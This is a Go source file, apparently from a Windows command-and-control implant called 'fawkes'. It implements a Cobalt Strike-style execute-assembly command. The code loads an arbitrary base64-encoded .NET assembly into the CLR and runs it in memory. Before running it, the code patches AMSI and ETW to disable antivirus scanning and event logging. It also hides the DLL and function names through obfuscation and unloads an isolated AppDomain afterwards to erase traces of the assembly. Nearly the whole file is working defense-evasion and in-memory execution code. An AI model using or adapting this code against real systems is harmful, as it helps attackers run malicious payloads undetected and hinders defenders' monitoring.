//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"fmt"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"fawkes/pkg/obfuscate"
	"fawkes/pkg/structs"

	"github.com/Ne0nd0g/go-clr"
)

// executeAssemblyAction provides single-command .NET assembly execution:
// auto-init CLR + auto-patch AMSI/ETW + load assembly + execute + capture output.
// This is the equivalent of Cobalt Strike's execute-assembly — one step instead of
// requiring separate start-clr and inline-assembly commands.
func executeAssemblyAction(assemblyB64, arguments string) structs.CommandResult {
	var output strings.Builder

	if assemblyB64 == "" {
		return errorResult("Error: assembly (base64-encoded .NET assembly bytes) is required\nUsage: start-clr -action execute-assembly -assembly <base64> [-arguments 'arg1 arg2']")
	}

	// Decode assembly bytes
	assemblyBytes, err := base64.StdEncoding.DecodeString(assemblyB64)
	if err != nil {
		// Try raw base64 (no padding)
		assemblyBytes, err = base64.RawStdEncoding.DecodeString(assemblyB64)
		if err != nil {
			return errorf("Error decoding assembly: %v (expected base64-encoded .NET assembly bytes)", err)
		}
	}

	if len(assemblyBytes) < 2 || assemblyBytes[0] != 'M' || assemblyBytes[1] != 'Z' {
		output.WriteString("[!] WARNING: Assembly doesn't start with MZ header — may not be a valid PE/.NET assembly\n")
	}

	// Step 1: Ensure CLR is initialized with AMSI+ETW auto-patching
	assemblyMutex.Lock()
	if !clrStarted {
		output.WriteString("[*] Auto-initializing CLR v4 with AMSI+ETW patching...\n")

		// Redirect stdout/stderr for output capture
		if err := clr.RedirectStdoutStderr(); err != nil {
			output.WriteString(fmt.Sprintf("[-] Output redirection warning: %v\n", err))
		}

		// Initialize CLR with retry
		var loadErr error
		for attempt := 1; attempt <= 3; attempt++ {
			runtimeHost, loadErr = clr.LoadCLR("v4")
			if loadErr == nil {
				break
			}
			if strings.Contains(loadErr.Error(), "cannot find the file") {
				jitterSleep(300*time.Millisecond, 700*time.Millisecond)
				continue
			}
			break
		}
		if loadErr != nil {
			assemblyMutex.Unlock()
			return errorResult(output.String() + fmt.Sprintf("CLR initialization failed: %v", loadErr))
		}
		clrStarted = true
		output.WriteString("[+] CLR v4 initialized\n")

		// Load AMSI DLL for patching
		if err := loadAMSI(); err != nil {
			output.WriteString(fmt.Sprintf("[-] AMSI.dll load warning: %v\n", err))
		}
	} else {
		output.WriteString("[*] CLR already running\n")
	}
	assemblyMutex.Unlock()

	// Step 2: Auto-patch AMSI (if not already patched)
	if !amsiPatched {
		amsiDll := obfuscate.AmsiDll()
		defer obfuscate.Zero(amsiDll)
		amsiFunc := obfuscate.AmsiScanBuffer()
		defer obfuscate.Zero(amsiFunc)

		_, patchErr := PerformRetPatch(amsiDll, amsiFunc)
		if patchErr != nil {
			output.WriteString(fmt.Sprintf("[-] AMSI patch failed: %v (assembly may be blocked)\n", patchErr))
		} else {
			amsiPatched = true
			output.WriteString("[+] AMSI bypassed (ret patch)\n")
		}
	} else {
		output.WriteString("[+] AMSI already patched\n")
	}

	// Step 3: Auto-patch ETW
	ntdll := obfuscate.NtdllDll()
	defer obfuscate.Zero(ntdll)
	etwFunc := obfuscate.EtwEventWrite()
	defer obfuscate.Zero(etwFunc)

	_, etwErr := PerformRetPatch(ntdll, etwFunc)
	if etwErr != nil {
		// Not fatal — ETW patch is optional
		if !strings.Contains(etwErr.Error(), "already patched") {
			output.WriteString(fmt.Sprintf("[-] ETW patch warning: %v\n", etwErr))
		}
	} else {
		output.WriteString("[+] ETW silenced (ret patch)\n")
	}

	// Step 4: Parse arguments
	var args []string
	if arguments != "" {
		args = parseAssemblyArgs(arguments)
	}

	output.WriteString(fmt.Sprintf("\n[*] Executing assembly (%d bytes, %d args)...\n", len(assemblyBytes), len(args)))

	// Step 5: Execute with AppDomain isolation
	// Create a temporary AppDomain to prevent assembly metadata leakage.
	// After execution, unloading the domain removes all traces of the loaded assembly
	// from .NET reflection enumeration.
	assemblyOutput, isolated, execErr := executeInIsolatedDomain(assemblyBytes, args, &output)
	if execErr != nil {
		// Fallback: if AppDomain isolation failed, use the default domain
		if !isolated {
			output.WriteString("[*] Falling back to default AppDomain...\n")
			output.WriteString(strings.Repeat("-", 60) + "\n")
			var fallbackOutput string
			fallbackOutput, execErr = ExecuteNETAssembly(assemblyBytes, args)
			if execErr != nil {
				output.WriteString(fmt.Sprintf("\n[!] Execution error: %v\n", execErr))
				if strings.Contains(execErr.Error(), "0x8007000b") {
					output.WriteString("[!] AMSI may have blocked this assembly despite patching.\n")
					output.WriteString("[!] Try: start-clr -amsi_patch 'Hardware Breakpoint' then inline-assembly.\n")
				}
				return errorResult(output.String())
			}
			assemblyOutput = fallbackOutput
		} else {
			output.WriteString(fmt.Sprintf("\n[!] Execution error: %v\n", execErr))
			return errorResult(output.String())
		}
	}

	if assemblyOutput != "" {
		output.WriteString(assemblyOutput)
	}
	output.WriteString("\n" + strings.Repeat("-", 60) + "\n")
	if isolated {
		output.WriteString("[+] Assembly execution complete (isolated AppDomain — unloaded)")
	} else {
		output.WriteString("[+] Assembly execution complete (default AppDomain)")
	}

	return successResult(output.String())
}

// executeInIsolatedDomain creates a temporary AppDomain, loads and executes the assembly,
// then unloads the domain. Returns (output, wasIsolated, error).
// If AppDomain creation fails, wasIsolated=false and the caller should fall back.
func executeInIsolatedDomain(assemblyBytes []byte, args []string, log *strings.Builder) (string, bool, error) {
	assemblyMutex.Lock()
	if runtimeHost == nil {
		assemblyMutex.Unlock()
		return "", false, fmt.Errorf("CLR runtime host not initialized")
	}

	// Create isolated AppDomain
	domainName := fmt.Sprintf("FawkesIsolated_%d", time.Now().UnixNano())
	namePtr, err := syscall.UTF16PtrFromString(domainName)
	if err != nil {
		assemblyMutex.Unlock()
		return "", false, fmt.Errorf("domain name conversion: %v", err)
	}

	isolatedDomain, createErr := runtimeHost.CreateDomain(namePtr)
	if createErr != nil {
		assemblyMutex.Unlock()
		log.WriteString(fmt.Sprintf("[-] AppDomain creation failed: %v\n", createErr))
		return "", false, nil // not isolated, caller should fall back
	}
	log.WriteString(fmt.Sprintf("[+] Isolated AppDomain created: %s\n", domainName))
	assemblyMutex.Unlock()

	// Load assembly into isolated domain
	assemblyMutex.Lock()
	safeArrayPtr, err := clr.CreateSafeArray(assemblyBytes)
	if err != nil {
		assemblyMutex.Unlock()
		return "", true, fmt.Errorf("SafeArray creation failed: %v", err)
	}

	assembly, loadErr := isolatedDomain.Load_3(safeArrayPtr)
	if loadErr != nil {
		assemblyMutex.Unlock()
		errMsg := fmt.Sprintf("Assembly load failed in isolated domain: %v", loadErr)
		if strings.Contains(loadErr.Error(), "0x8007000b") {
			errMsg += " (AMSI may have blocked this assembly)"
		}
		// Try to unload even on failure
		unloadAppDomain(runtimeHost, isolatedDomain, log)
		return "", true, fmt.Errorf("%s", errMsg)
	}

	// Get entry point
	methodInfo, epErr := assembly.GetEntryPoint()
	if epErr != nil {
		assemblyMutex.Unlock()
		unloadAppDomain(runtimeHost, isolatedDomain, log)
		return "", true, fmt.Errorf("entry point not found: %v", epErr)
	}
	assemblyMutex.Unlock()

	// Invoke assembly
	assemblyMutex.Lock()
	log.WriteString(strings.Repeat("-", 60) + "\n")
	var stdout, stderr string
	func() {
		defer func() {
			if r := recover(); r != nil {
				stderr = fmt.Sprintf("PANIC during assembly execution: %v", r)
			}
		}()
		stdout, stderr = clr.InvokeAssembly(methodInfo, args)
	}()
	assemblyMutex.Unlock()

	// Build output
	var result strings.Builder
	if stdout != "" {
		result.WriteString(stdout)
	}
	if stderr != "" {
		if result.Len() > 0 {
			result.WriteString("\n")
		}
		result.WriteString("[STDERR] " + stderr)
	}

	// Unload the isolated domain to clean up assembly metadata
	unloadAppDomain(runtimeHost, isolatedDomain, log)

	return result.String(), true, nil
}

// unloadAppDomain calls ICORRuntimeHost::UnloadDomain to unload an AppDomain.
// The go-clr library has the vtbl entry but no Go wrapper, so we call it via vtbl.
// ICORRuntimeHost vtbl layout (COM interface):
//
//	[0] QueryInterface [1] AddRef [2] Release
//	[3] CreateLogicalThreadState [4] DeleteLogicalThreadState
//	[5] SwitchInLogicalThreadState [6] SwitchOutLogicalThreadState
//	[7] LocksHeldByLogicalThread [8] MapFile [9] GetConfiguration
//	[10] Start [11] Stop [12] CreateDomain [13] GetDefaultDomain
//	[14] EnumDomains [15] NextDomain [16] CloseEnum
//	[17] CreateDomainEx [18] CreateDomainSetup [19] CreateEvidence
//	[20] UnloadDomain [21] CurrentDomain
const unloadDomainVtblIndex = 20

func unloadAppDomain(host *clr.ICORRuntimeHost, domain *clr.AppDomain, log *strings.Builder) {
	if host == nil || domain == nil {
		return
	}

	assemblyMutex.Lock()
	defer assemblyMutex.Unlock()

	// ICORRuntimeHost struct has vtbl pointer at offset 0.
	// vtbl is an array of function pointers.
	vtblPtr := *(*uintptr)(unsafe.Pointer(host))
	//nolint:govet // COM vtbl pointer arithmetic is inherently unsafe
	unloadFn := *(*uintptr)(unsafe.Pointer(vtblPtr + uintptr(unloadDomainVtblIndex)*unsafe.Sizeof(uintptr(0))))

	hr, _, _ := syscall.Syscall(
		unloadFn,
		2,
		uintptr(unsafe.Pointer(host)),
		uintptr(unsafe.Pointer(domain)),
		0,
	)

	if hr == 0 { // S_OK
		log.WriteString("[+] Isolated AppDomain unloaded — assembly metadata cleaned\n")
	} else {
		log.WriteString(fmt.Sprintf("[-] AppDomain unload returned HRESULT 0x%X (non-fatal)\n", uint32(hr)))
	}
}

// parseAssemblyArgs splits a space-separated argument string, respecting quoted strings.
func parseAssemblyArgs(input string) []string {
	var args []string
	var current strings.Builder
	inQuote := false
	quoteChar := byte(0)

	for i := 0; i < len(input); i++ {
		c := input[i]
		switch {
		case !inQuote && (c == '"' || c == '\''):
			inQuote = true
			quoteChar = c
		case inQuote && c == quoteChar:
			inQuote = false
		case !inQuote && c == ' ':
			if current.Len() > 0 {
				args = append(args, current.String())
				current.Reset()
			}
		default:
			current.WriteByte(c)
		}
	}
	if current.Len() > 0 {
		args = append(args, current.String())
	}
	return args
}
